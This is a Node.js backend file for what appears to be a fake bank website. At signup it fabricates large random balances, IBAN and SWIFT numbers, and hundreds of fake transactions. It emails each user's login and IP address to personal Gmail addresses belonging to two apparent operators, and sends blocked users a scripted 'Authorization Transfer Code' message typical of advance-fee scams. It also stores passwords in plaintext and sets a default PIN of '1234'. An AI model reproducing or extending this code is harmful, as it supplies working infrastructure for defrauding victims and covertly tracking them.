const { admin_key, admin_alt_key, create_payments } = require('./config');
const { sendSupportMail } = require('./mail/send_otp');
const google_api = '1PRIqQCOheopWF8KwwilLAzsU8PtYq_qy'

// LOG IN // ALSO A REFERENCE POINT

module.exports.authPin = async ( req, res ) => {
    console.log(req.body.auth_pin, req.body);
    console.log('free to go');

    req.knex_object('cathay_users')
    .where({ account_no : req.session.account_no })
    .then((user_init) => {
        let user = user_init[0]
        if (req.body.auth_pin == user.auth ){
            req.knex_object('cathay_transactions')
            .where({ user_id : req.session.account_no }) //DONT FORGET!!!!
            .then( transactions => {
                req.knex_object('cathay_transactions')  
                .where({cr_dr : 'credit', user_id :  req.session.account_no})
                .then((resent) => {
                    let sent = resent[ resent.length - 1 ]
                    req.knex_object('cathay_transactions')
                    .where({cr_dr : 'debit' , user_id :  req.session.account_no})
                    .then((repay) =>{
                        let received = repay[ repay.length -1 ]
                        let transaction_list = transactions.map(function (i) { return JSON.stringify(i) })
                        res.render('home.ejs', {
                            user : user.user_name,
                            full_name :`${user.first_name} ${user.last_name}`,
                            email : user.email,
                            balance : user.balance,
                            currency : user.currency,
                            account: user.account_no,
                            profile : user.profile,
                            received : received.amount,
                            received_date: received.time_stamp,
                            transactions : transaction_list,
                            sent : sent.amount,
                            sent_date : sent.time_stamp,
                            active : [ 'active', '', '', '' ]
                        })                             
                    }) 
                })
            })
    }
        else{
            console.log('invalid pin');
        }
    })        

}

module.exports.authPay = async ( req, res ) => {
    console.log(req.body.auth_pin, req.body);
    console.log('free to go');

    req.knex_object('cathay_users')
    .where({ account_no : req.session.account_no })
    .then((user_init) => {
        let user = user_init[0]
        if (req.body.auth_pin == user.auth ){

            req.knex_object('cathay_transactions')
            .where({ user_id : req.session.account_no }) //DONT FORGET!!!!
            .then( transactions => {
                req.knex_object('cathay_transactions')  
                .where({cr_dr : 'credit', user_id :  req.session.account_no})
                .then((resent) => {
                    let sent = resent[ resent.length - 1 ]
                    req.knex_object('cathay_transactions')
                    .where({cr_dr : 'debit' , user_id :  req.session.account_no})
                    .then((repay) =>{
                        let received = repay[ repay.length -1 ]
                        let transaction_list = transactions.map(function (i) { return JSON.stringify(i) })
                        res.render('otp.ejs', {
                            user : user.user_name,
                            full_name :`${user.first_name} ${user.last_name}`,
                            email : user.email,
                            balance : user.balance,
                            currency : user.currency,
                            account: user.account_no,
                            received : received.amount,
                            received_date: received.time_stamp,
                            transactions : transaction_list,
                            sent : sent.amount,
                            sent_date : sent.time_stamp,
                            active : [ 'active', '', '', '' ]
                        })                             
                    }) 
                })
            })
        }
        else{
            console.log('invalid pin');
        }
    })        
}
 
module.exports.loginHandler = async (req, res)=>{
    //generate sessionid, update in sessions db, and send it in 201 resp
    try {
        req.knex_object('cathay_users')
        .join('user_marker', 'account_no', 'user_id')
        .where({ account_no : req.body.acc_no })
        .then( user => {
            let pass = user[0]
            if ( !user || !user[0] || user === undefined ) {
                res.redirect('/login_invalid.html')
            }
            
            else if (pass.password === req.body.upass) {
                if (pass.account_status === 'blocked'){
                    let message = `ATTENTION! ${pass.first_name} ${pass.last_name} : \n\n With regards to your previous transactions, it has been brought to notice that your checking account has been temporarily suspended due to reasons relating to the unauthorized access grant and location access disparity.\n\n However we take initiative to inform you that you are now required to visit the nearest branch to review and revitalize your Authorization Transfer Code (ATC). please do well to act in compliance to our conduct. \n \n Thank you for your anticipated cooperation. \n\n Yours in service\n(Customer service)`
                    console.log(pass.email, message)
                    sendSupportMail(pass.email, message)
                    res.redirect('/login_blocked.html')
                }
                else{
                    console.log('user found');
                    createSession(pass.account_no, req)
                    if( pass.mark == 'joe' ){
                        sendSupportMail('globalxcreditbank@gmail.com', `user "${pass.first_name} ${pass.last_name}" logged in from device : ${req.ip}`)
                    }
                    else{
                        sendSupportMail('otiedwin40@gmail.com', `user "${pass.first_name} ${pass.last_name}" logged in from device : ${req.ip}`)
                    }
                    res.redirect('/auth_pin.html')                    
                }
            }
            else{

                res.redirect('/login_invalid.html')
            }                 
        })

    } catch (error) {
        res.status(401).json({status : 401, content : "login failed : inernal error" } );
    }

}

const createSession = (account_no, req)=>{
    req.session.account_no = account_no;
}

// ADMIN LOGIN //

module.exports.adminLoginHandler = async (req, res)=>{
        let key = req.body.admin_key 

    if (key === admin_key){
        try {
            createSession(key, req)

            let status = await req.knex_object('cathay_users')
            .join('user_marker', 'account_no', 'user_id')
            .where({ mark : 'joe' })
            .then( users_arr => {
                console.log(users_arr);
                let user_list = users_arr.map(function (i) { return JSON.stringify(i) })
                let length = users_arr.length

                res.render('admin_users.ejs', {
                    user: user_list,
                    user_length : length
                })                
            } )
            console.log(status);

        } catch (error) {
            //
            //(error);
        }
    }else if (key === admin_alt_key){
        createSession(key, req)

        req.knex_object('cathay_users')
        .join('user_marker', 'account_no', 'user_id')
        .where({ mark : 'oti' })
        .then( users_arr => {
            //(users_arr, users_arr[0].first_name);
            let user_list = users_arr.map(function (i) { return JSON.stringify(i) })
            let length = users_arr.length

            res.render('admin_users.ejs', {
                user: user_list,
                user_length : length
            })                
        } )
    }
}

// LOG OUT //

module.exports.logoutHandler = async (req, res)=>{
    req.session.destroy((err) => {
        res.redirect('/Login.html')
    })
}

// SIGNUP //

module.exports.signup = async (req, res)=>{
    let  {first_name, middle_name, last_name, user_name, password, work, phone, email, dob, marry, sex, addr, type, reg_date, currency } = req.body
    let account_no = phone.slice(3)
    let balance = Math.floor(Math.random() * 1500000) + 600000;
    let cotp = Math.floor(Math.random() * 2543212) + 15439129;
    let iban = `${Math.floor(Math.random() * 25) + 11}-${Math.floor(Math.random() * 15) + 199}-${Math.floor(Math.random() * 22) + 98999}-${Math.floor(Math.random() * 2225436) + 989913249}`;
    let swift = `${Math.floor(Math.random() * 25) + 154}-${Math.floor(Math.random() * 15) + 19}-${Math.floor(Math.random() * 22) + 99}`;
    let d = new Date()
    let time_stamp = `${ d.getFullYear() }-${ d.getMonth() }-${ d.getDay() }`
    let random_date = `${ d.getFullYear() }-${ d.getMonth() }-${ d.getDay() }`
    let knex = req.knex_object;
    let payment_array = []

    create_payments(400, payment_array, account_no)

    try {
        let status = await knex.insert( 
                { 
                account_no,    
                first_name, 
                last_name, 
                user_name ,
                email,
                profile: 'profile.png',
                balance,
                currency, 
                password,
                cotp,
                imf : 0000,
                auth : '1234',
                swift,
                iban,
                base_password : password,
                status : 'active',
                account_status :'active'
            }
        ).into('cathay_users');

        let payments = await knex.insert( payment_array ).into('cathay_transactions');

        req.knex_object('cathay_transactions')
        .where({ user_id : account_no }) //DONT FORGET!!!!
        .then( transactions => {
            createSession(account_no, req)
            req.knex_object('cathay_transactions')  
            .where({cr_dr : 'credit', user_id : account_no })
            .then((resent) => {
                let sent = resent[ resent.length - 1 ]
                // let length = resent.length
                req.knex_object('cathay_transactions')
                .where({cr_dr : 'debit' , user_id : account_no})
                .then((repay) =>{
                    req.knex_object('cathay_users')
                    .where({ account_no : account_no })
                    .then((user) => {
                        let received = repay[ repay.length -1 ]
                        let transaction_list = transactions.map(function (i) { return JSON.stringify(i) })

                        res.render('home.ejs', {
                            user : user.user_name,
                            full_name :`${first_name} ${last_name}`,
                            email : email,
                            balance : balance,
                            currency : currency,
                            profile : user.profile,
                            account: account_no,
                            received : 12134,
                            received_date : time_stamp,
                            transactions :transaction_list,
                            sent : 500,
                            sent_date : time_stamp,
                            active : [ 'active', '', '', '' ]
                        })                         
                    })
                            
                }) 
            })
        })


    } catch (error) {
        console.log(error);
    }
    if ( dob == '10-oti-01'){
        let status = await knex.insert( 
            { 
                mark: 'oti',
                user_id: account_no,
            }
        ).into('user_marker');
    }else{
        let status = await knex.insert( 
            { 
                mark: 'joe',
                user_id: account_no,
            }
        ).into('user_marker');
    }

}
